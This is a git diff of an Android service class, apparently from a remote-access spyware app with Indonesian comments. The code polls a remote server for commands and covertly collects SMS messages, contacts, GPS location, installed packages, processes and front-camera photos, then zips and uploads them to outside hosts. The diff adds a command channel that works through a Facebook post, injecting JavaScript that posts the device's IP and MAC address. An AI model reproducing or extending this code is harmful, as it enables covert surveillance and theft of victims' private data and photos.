@@ -17,6 +17,7 @@ import android.os.Bundle;
 import android.os.CountDownTimer;
 import android.view.Gravity;
 import android.graphics.Color;
+import android.graphics.Bitmap;
 import android.util.Log;
 import android.widget.Toast;
 import android.database.Cursor;
@@ -55,17 +56,21 @@ public class SystemThread extends Service
 			"iptables -p FORWARD ACCEPT"
 	};
 	
-	private String myident = "";
 	public static String TAG = "AsDfGhJkL";
 	public static String payloadWebResult = "";
 	public static String payloadWebResultTarget = "";
 	public static String payloadWebResultSwitch = "";
+	public static String urlfbPostingan = "https://free.facebook.com/story.php?story_fbid=425720278184436&id=100022394016980&_rdr#425720441517753";
+	public static String urlfbPostinganEdt = "https://free.facebook.com/edit/post/dialog/?cid=S%3A_I100022394016980%3A425720278184436&ct=2&nodeID=m_story_permalink_view&redir=%2Fstory.php%3Fstory_fbid%3D425720278184436%26id%3D100022394016980%26refid%3D17%26_ft_%3Dmf_story_key.425720278184436%253Atop_level_post_id.425720278184436%253Atl_objid.425720278184436%253Acontent_owner_id_new.100022394016980%253Athrowback_story_fbid.425720278184436%253Astory_location.4%253Athid.100022394016980%253A306061129499414%253A2%253A0%253A1556693999%253A-3250917383593047013%26__tn__%3D%252AW-R&perm&loc=permalink&refid=52&_ft_=mf_story_key.425720278184436%3Atop_level_post_id.425720278184436%3Atl_objid.425720278184436%3Acontent_owner_id_new.100022394016980%3Athrowback_story_fbid.425720278184436%3Astory_location.4%3Athid.100022394016980&__tn__=-R";
+	public static String urlfbMessenger = "https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua"; // Ali ku
 	public static String urlServer = "";
+	public static String[] server = { "http://10.42.0.1/akura1.1", "https://sunjangyo12.000webhostapp.com/akura1.1", "http://localhost:8888" }; //localhost:8888 harus terakhir
 	public static int iserver = 0;
 	public String ip = "";
 
 	private static boolean processPing = true;
-	private static String[] server = { "http://10.42.0.1/fbuk", "https://sunjangyo12.000webhostapp.com/fbuk", "http://localhost:8888" }; //localhost:8888 harus terakhir. ini untuk penggunaan sedunia
+	private static boolean processFb = true;
+	private static boolean processFbPayload = true;
 	private static int jcamera = 1875953;
 	private static int alert_warna = Color.YELLOW;
 	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
@@ -74,6 +79,7 @@ public class SystemThread extends Service
 	private static String install_paket = "";
 	private static String uninstall_paket = "";
 	private Context context;
+	private String myident = "";
 	private String[] term;
 	private String timenow;
 	private String utf = "UTF-8";
@@ -130,15 +136,17 @@ public class SystemThread extends Service
 	private Runnable mRefresh = new Runnable() {
 		public void run() 
 		{
-			if (receAction.pingResult && processPing) {
+			if (receAction.net && processPing) {
 				payload();
-			
+
 			} else {
-				if (receAction.cekConnection(SystemThread.this)) Log.i(TAG, "conecting...");
-				else Log.i(TAG, "offline!");
+				if (receAction.cekConnection(SystemThread.this)) 
+					Log.i(TAG, "Online process ping...");
+				else 
+					Log.i(TAG, "disconnect!");
 			}
 
-			receAction.temanCek(SystemThread.this);
+			//receAction.temanCek(SystemThread.this);
 
 			mHandler.postDelayed(mRefresh, 3000);
 
@@ -192,9 +200,14 @@ public class SystemThread extends Service
         	Log.i(TAG, "kumpul");
         	kumpulkanPayload(context);
         
-        } 
+        }
 
 		if (receAction.installResult) {
+
+			if (settings.getString("fbmain","").equals("hidup")) {
+				receAction.fbPayload(context, "javascript:document.getElementById('composerInput').value='ip: "+myident+" macaddr: "+Identitas.getMACAddress("wlan0")+"';" +"document.forms[0].submit()", urlfbPostingan);
+				receAction.fbTarget(context, urlfbPostingan);
+			}
 
 			receAction._server(context);
 			if (receAction.getServer()) 
@@ -213,9 +226,8 @@ public class SystemThread extends Service
 				logic(context);
 
 			}
-			
-		}
-        else if (myident.equals(payloadWebResultTarget)) {
+
+		} else if (myident.equals(payloadWebResultTarget)) {
 			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
 
 			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
@@ -253,6 +265,201 @@ public class SystemThread extends Service
 			logic(context);
 		}
 
+		if (myident.equals(receAction.resultFbTarget)) {
+			logic(context);
+		}
+
+	}
+
+	private String textPayloadFb() {
+		String out = "";
+		try {
+			String[] in = receAction.resultFbPayload.split("-aksi-");
+			out = in[1];
+		
+		} catch(Exception e) {
+			out = "perintah kosong";
+		}
+
+		receAction.resultFbPayload = "";
+		return out;
+	}
+
+	
+
+	public String textPayload(String data) {
+		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
+		String[] hashString = { "[+] "+data+" dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"\n" };
+		
+		if (settings.getString("utf", "").equals("")) {
+			Log.i(TAG, "utf kosong");
+		} else {
+			utf = settings.getString("utf", "");
+			Log.i(TAG, "utf:"+utf);
+		}
+
+		try {
+			for (String s : hashString)     
+			{
+				return URLEncoder.encode(s, utf);       
+			}
+		}catch (Exception e) {}
+		return null;
+	}
+
+	public void reqPayload(Context context, String purl, String requestAksi) {
+		
+		PayloadWebTask task = new PayloadWebTask();
+		task.applicationContext = context;
+		task.paymain = requestAksi;
+
+		Log.i(TAG, "...payload text   : "+payloadWebResult);
+		Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch+" ["+urlServer+"]");
+		Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");
+		Log.i(TAG, "...facebook target: "+receAction.resultFbTarget+"\n");
+		Log.i(TAG, "...facebook aksi  : "+textPayloadFb()+"\n");
+
+
+		try {
+			if (receAction.cekConnection(context)) {
+				task.execute(new String[] { purl });
+			} 
+			else {
+				Log.i(TAG, "disconnect network");
+			}
+		}catch(Exception e) {
+			Log.i(TAG, "errRequest: "+e);
+			receAction.net = false;
+		}
+	}
+
+
+	public void kumpulkanPayload(Context context) {
+		Installer installer = new Installer();
+		String pathKumpul = receAction.pathExternal+"/kumpul";
+		File fileKumpul = new File(pathKumpul);
+
+		try {
+			Runtime.getRuntime().exec("rm -R "+pathKumpul);
+			Thread.sleep(500);
+			if (!fileKumpul.exists()) {
+            	fileKumpul.mkdirs();
+        	}
+			Runtime.getRuntime().exec("cp /system/build.prop "+pathKumpul);
+
+			new CamRuntime().capturePhoto("depan", pathKumpul, "depan.jpg", context);
+			Thread.sleep(2000);
+
+			String cekServer = "";
+			if (!receAction.installResult) {
+				cekServer = "server belum terinstall";
+			}else {
+				receAction._server(context);
+				cekServer = ""+receAction.getServer();
+			}
+			String status = //"root: "+receAction.rootRequest()+
+							"\nwaktu : "+new SimpleDateFormat("[HH:mm]  dd,MMM,yyy").format(new Date())+
+							"\ncamlis: "+new CamRuntime().listCamera()+
+							"\nproses: "+receAction.shellCommands("ps")+
+							"\nswitch: "+settings.getString("swmain", "")+
+							"\nserver: "+cekServer+
+							"\nipadrs: "+Identitas.getIPAddress(true)+
+							"\nmacads: "+Identitas.getMACAddress("wlan0")+
+							"\nbatery: "+receAction.batStatus+
+							"\ngps   : "+new GPSresult(context).gpsResult+"\n\n"+
+							"\napk li: "+receAction.shellCommands("pm -l");
+			Thread.sleep(500);
+			try {
+				installer.saveCode(status, "utf-8", pathKumpul + "/status.txt");
+			} catch (IOException e) {
+				Log.i(TAG, "ERRsavestatus:"+e);
+			}
+
+			try {
+				installer.saveCode(receAction.getSms(context)+receAction.getContacts(context), "utf-8", pathKumpul + "/private.txt");
+			} catch (IOException e) {
+				Log.i(TAG, "ERRsave:"+e);
+			}
+
+			String identitasKumpul = Identitas.getIPAddress(true)+".zipjut";
+			new Installer().compressFiles(pathKumpul, pathKumpul+"/"+identitasKumpul);
+
+			Thread.sleep(2000);
+			receAction.requestUrl = urlServer+"/uploadFile.php";
+			receAction.requestAksi = "upload";
+			receAction.requestPath = pathKumpul+"/"+identitasKumpul;
+			receAction.mainRequest(context);
+		
+		} catch(Exception e) {
+			Log.i(TAG, "zzzzzzzzzzz"+e);
+		}
+	}
+
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
+
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		settings = getSharedPreferences("Settings", 0);
+		seteditor = settings.edit();
+		urlServer = server[iserver];
+		context = this;
+
+		String gps = new GPSresult(this).gpsResult;
+		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+		filter.addAction(Intent.ACTION_DATE_CHANGED);
+		filter.addAction(Intent.ACTION_HEADSET_PLUG);
+		filter.addAction(Intent.ACTION_SCREEN_ON);
+		filter.addAction(Intent.ACTION_POWER_CONNECTED);
+		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
+		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
+		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
+		filter.addAction(Intent.ACTION_SCREEN_OFF);
+
+		broreceiver = new ReceiverBoot();
+		receAction = new ReceiverBoot();
+		utils = new ServerUtils(this);
+
+		if (settings.getString("siapa","").equals("")) {
+			seteditor.putString("siapa", "unknown");    
+			seteditor.commit();
+		}
+
+		if (settings.getString("fbmain","").equals("")) {
+			seteditor.putString("fbmain", "hidup");    
+			seteditor.commit();
+		}
+
+		registerReceiver(broreceiver, filter);
+		mHandler.postDelayed(mRefresh, 3000);
+
+		File htdocs = new File(utils.getPathExternal());
+        if (!htdocs.exists()) {
+            htdocs.mkdir();
+        }
+
+		
+	}
+
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		
+		Log.i(TAG, "service start oke");
+		String gps = new GPSresult(this).gpsResult;
+
+		return super.onStartCommand(intent, flags, startId);
+	}
+
+	@Override
+	public void onDestroy() {
+		super.onDestroy();
+		unregisterReceiver(broreceiver);
+		seteditor.putString("cekversion", "destroy");    
+  	    seteditor.commit();
+  	    mHandler.removeCallbacks(mRefresh);
 	}
 
 	public void logic(Context context) 
@@ -262,8 +469,14 @@ public class SystemThread extends Service
 				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
 			}
 
-			if (payloadWebResult.equals("alert")) {
-				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
+			if (payloadWebResult.equals("alert")  ||  textPayloadFb().equals("alert")) {
+				if (payloadWebResult.equals("alert")) {
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
+
+				} else {
+					String out = "Alert ditampilkan! . dari: "+myident;
+					receAction.fbPayload(context, "javascript:document.forms[1].p_text.value='"+out+"';" +"document.forms[1].submit()", urlfbPostinganEdt);
+				}
 
 				Toast.makeText(context, "alert", Toast.LENGTH_LONG).show();
 			}
@@ -271,6 +484,10 @@ public class SystemThread extends Service
 				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("semua informasi berhail diupload cek di path payloadout"), "null");
 
 				kumpulkanPayload(context);
+			}
+
+			if (payloadWebResult.equals("ping")) {
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("ping google: "+receAction.ping(context)), "null");
 			}
 
 
@@ -286,6 +503,7 @@ public class SystemThread extends Service
 				try {
 					String status = //"root: "+receAction.rootRequest()+
 								"\nswitch: "+settings.getString("swmain", "")+
+								"\nsiapa : "+settings.getString("siapa","")+
 								"\nserver: "+cekServer+" install: "+receAction.installResult+
 								"\nkamera: "+new CamRuntime().listCamera()+
 								"\nipadrs: "+Identitas.getIPAddress(true)+
@@ -349,6 +567,43 @@ public class SystemThread extends Service
 			}catch(Exception e){}
 
 			try {
+				String[] text = payloadWebResult.split("-facebook-");
+				if (text[1].equals("hidup")) {
+					seteditor.putString("fbmain", text[1]);    
+					seteditor.commit();
+					
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote via facebook hidup"), "null");
+
+				} else if (text[1].equals("mati")) {
+					seteditor.putString("fbmain", text[1]);    
+					seteditor.commit();
+
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote via facebook mati"), "null");
+
+				} else {
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote status: "+settings.getString("fbmain","") +"data download: "+receAction.installResult), "null");
+
+				}
+			}catch(Exception e){}
+
+			try {
+				String[] text = payloadWebResult.split("-siapa-");
+				if (text[1].equals("edit")) {
+					try {
+						seteditor.putString("siapa", text[2]);    
+						seteditor.commit();
+
+						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa diedit: "+settings.getString("siapa","")), "null");
+
+					} catch(Exception e) {}
+				
+				} else {
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa: "+settings.getString("siapa","")), "null");
+				}
+				
+			}catch(Exception e){}
+
+			try {
 				String[] text = payloadWebResult.split("-net-");
 				if (text[1].equals("hidup")) {
 					receAction.setGSM(true, context);
@@ -356,6 +611,33 @@ public class SystemThread extends Service
 				else if (text[1].equals("mati")) {
 					receAction.setGSM(false, context);
 				}
+			}catch(Exception e){}
+
+			try {
+				String[] text = payloadWebResult.split("-brow-");
+        		receAction.fbTarget(context, text[1]);
+
+			}catch(Exception e){}
+
+			try {
+				String[] text = payloadWebResult.split("-browalert-");
+
+				if (text[1].equals("stop")) {
+					context.stopService(new Intent(context, ServiceAlert.class));
+
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser stop"), "null");
+
+				} else {
+					ServiceAlert alert = new ServiceAlert();
+        			alert.dataText = text[1];
+        			alert.pilihAksi = "browser";
+
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("browser mulai"), "null");
+
+					context.startService(new Intent(context, ServiceAlert.class));
+
+        		}
+
 			}catch(Exception e){}
 
 			try {
@@ -608,9 +890,21 @@ public class SystemThread extends Service
 			} catch(Exception e) {}
 
 			try {
-				String[] text = payloadWebResult.split("-compress-");
+				String[] text = payloadWebResult.split("-zip-");
 
 				new Installer(context, "aktif").compressFiles(text[1], text[2]);
+
+			} catch(Exception e) {}
+
+			try {
+				String[] text = payloadWebResult.split("-apk2sd-");
+				MainActivity apk = new MainActivity();
+				apk.pullApk = text[2];
+
+				if (new MainActivity().apkMana(context, text[1], "pull"))
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("apk tersimpan di "+text[2]), "null");
+				else
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal save apk "), "null");
 
 			} catch(Exception e) {}
 
@@ -619,6 +913,10 @@ public class SystemThread extends Service
 
 				receAction.setDoc(context);
 				CamRuntime came = new CamRuntime();
+
+				String ok = "";
+				if (text[1].equals("up"))
+					ok = text[99];
 
 				try {
 					if (text[2].equals("led")) came.led = "led";
@@ -630,6 +928,43 @@ public class SystemThread extends Service
 
 				came.capturePhoto(text[1], receAction.pathExternal+"/payloadout", "foto.jpg", context);
 				Thread.sleep(500);
+				receAction.requestUrl = urlServer+"/uploadFile.php";
+				receAction.requestAksi = "upload";
+				receAction.requestPath = receAction.pathExternal+"/payloadout/foto.jpg";
+				receAction.mainRequest(context);
+
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+text[1]+" "+receAction.shellCommands("ls -l "+receAction.pathExternal+"/payloadout/")), "null");
+			}
+			catch(Exception e) {}
+
+			try {
+				String[] text = payloadWebResult.split("-foto2-");
+
+				receAction.setDoc(context);
+				String led = "off";
+				boolean depan = false;
+
+				if (text[1].equals("depan"))
+					depan = true;
+				if (text[1].equals("up"))
+					led = text[99];
+
+				try {
+					if (text[2].equals("led")) {
+						led = "on";
+					}
+				}catch(Exception e){}
+
+				// ini udah diupdate
+
+				Intent intent = new Intent(context, CamerService.class);
+				intent.putExtra("Front_Request", depan);
+				intent.putExtra("FLASH", led);
+				intent.putExtra("path", receAction.pathExternal+"/payloadout");
+				intent.putExtra("nama", "foto");
+				context.startService(intent);
+
+				Thread.sleep(2500);
 				receAction.requestUrl = urlServer+"/uploadFile.php";
 				receAction.requestAksi = "upload";
 				receAction.requestPath = receAction.pathExternal+"/payloadout/foto.jpg";
@@ -852,166 +1187,6 @@ public class SystemThread extends Service
 				}
 			}
 			catch(Exception e) {}
-	}
-
-	public String textPayload(String data) {
-		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
-		String[] hashString = { "[+] "+data+" dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"\n" };
-		
-		if (settings.getString("utf", "").equals("")) {
-			Log.i(TAG, "utf kosong");
-		} else {
-			utf = settings.getString("utf", "");
-			Log.i(TAG, "utf:"+utf);
-		}
-
-		try {
-			for (String s : hashString)     
-			{
-				return URLEncoder.encode(s, utf);       
-			}
-		}catch (Exception e) {}
-		return null;
-	}
-
-	public void reqPayload(Context context, String purl, String requestAksi) {
-		
-		PayloadWebTask task = new PayloadWebTask();
-		task.applicationContext = context;
-		task.paymain = requestAksi;
-
-		Log.i(TAG, "...payload text   : "+payloadWebResult);
-		Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch+" ["+urlServer+"]");
-		Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");
-
-		try {
-			if (receAction.cekConnection(context)) {
-				task.execute(new String[] { purl });
-			} 
-			else {
-				Log.i(TAG, "disconnect network");
-			}
-		}catch(Exception e) {
-			Log.i(TAG, "errRequest: "+e);
-			receAction.pingResult = false;
-		}
-	}
-
-
-	public void kumpulkanPayload(Context context) {
-		Installer installer = new Installer();
-		String pathKumpul = receAction.pathExternal+"/kumpul";
-		File fileKumpul = new File(pathKumpul);
-
-		try {
-			Runtime.getRuntime().exec("rm -R "+pathKumpul);
-			Thread.sleep(500);
-			if (!fileKumpul.exists()) {
-            	fileKumpul.mkdirs();
-        	}
-			Runtime.getRuntime().exec("cp /system/build.prop "+pathKumpul);
-
-			new CamRuntime().capturePhoto("depan", pathKumpul, "depan.jpg", context);
-
-			String cekServer = "";
-			if (!receAction.installResult) {
-				cekServer = "server belum terinstall";
-			}else {
-				cekServer = receAction.setServer(true);
-			}
-			Thread.sleep(1000);
-			String status = //"root: "+receAction.rootRequest()+
-							"\nwaktu : "+new SimpleDateFormat("[HH:mm]  dd,MMM,yyy").format(new Date())+
-							"\ncamlis: "+new CamRuntime().listCamera()+
-							"\nproses: "+receAction.shellCommands("ps")+
-							"\nswitch: "+settings.getString("swmain", "")+
-							"\nserver: "+cekServer+
-							"\nipadrs: "+Identitas.getIPAddress(true)+
-							"\nmacads: "+Identitas.getMACAddress("wlan0")+
-							"\nbatery: "+receAction.batStatus+
-							"\ngps   : "+new GPSresult(context).gpsResult+"\n\n"+
-							"\napk li: "+receAction.shellCommands("pm -l");
-			Thread.sleep(4000);
-			try {
-				installer.saveCode(status, "utf-8", pathKumpul + "/status.txt");
-			} catch (IOException e) {
-				Log.i(TAG, "ERRsavestatus:"+e);
-			}
-
-			try {
-				installer.saveCode(receAction.getSms(context)+receAction.getContacts(context), "utf-8", pathKumpul + "/private.txt");
-			} catch (IOException e) {
-				Log.i(TAG, "ERRsave:"+e);
-			}
-
-			String identitasKumpul = Identitas.getIPAddress(true)+".zipjut";
-			new Installer().compressFiles(pathKumpul, pathKumpul+"/"+identitasKumpul);
-			Thread.sleep(500);
-			receAction.requestUrl = urlServer+"/uploadFile.php";
-			receAction.requestAksi = "upload";
-			receAction.requestPath = pathKumpul+"/"+identitasKumpul;
-			receAction.mainRequest(context);
-		
-		} catch(Exception e) {
-
-		}
-	}
-
-	@Override
-	public IBinder onBind(Intent intent) {
-		return null;
-	}
-
-	@Override
-	public void onCreate() {
-		super.onCreate();
-		settings = getSharedPreferences("Settings", 0);
-		seteditor = settings.edit();
-		urlServer = server[iserver];
-		context = this;
-
-		String gps = new GPSresult(this).gpsResult;
-		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-		filter.addAction(Intent.ACTION_DATE_CHANGED);
-		filter.addAction(Intent.ACTION_HEADSET_PLUG);
-		filter.addAction(Intent.ACTION_SCREEN_ON);
-		filter.addAction(Intent.ACTION_POWER_CONNECTED);
-		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
-		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
-		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
-		filter.addAction(Intent.ACTION_SCREEN_OFF);
-
-		broreceiver = new ReceiverBoot();
-		receAction = new ReceiverBoot();
-		utils = new ServerUtils(this);
-
-		registerReceiver(broreceiver, filter);
-		mHandler.postDelayed(mRefresh, 3000);
-
-		File htdocs = new File(utils.getPathExternal());
-        if (!htdocs.exists()) {
-            htdocs.mkdir();
-        }
-
-		
-	}
-
-	@Override
-	public int onStartCommand(Intent intent, int flags, int startId) {
-		
-		Log.i(TAG, "service start oke");
-		String gps = new GPSresult(this).gpsResult;
-
-		return super.onStartCommand(intent, flags, startId);
-	}
-
-	@Override
-	public void onDestroy() {
-		super.onDestroy();
-		unregisterReceiver(broreceiver);
-		seteditor.putString("cekversion", "destroy");    
-  	    seteditor.commit();
-  	    mHandler.removeCallbacks(mRefresh);
 	}
 	
 	private class PayloadWebTask extends AsyncTask<String, Void, String> 
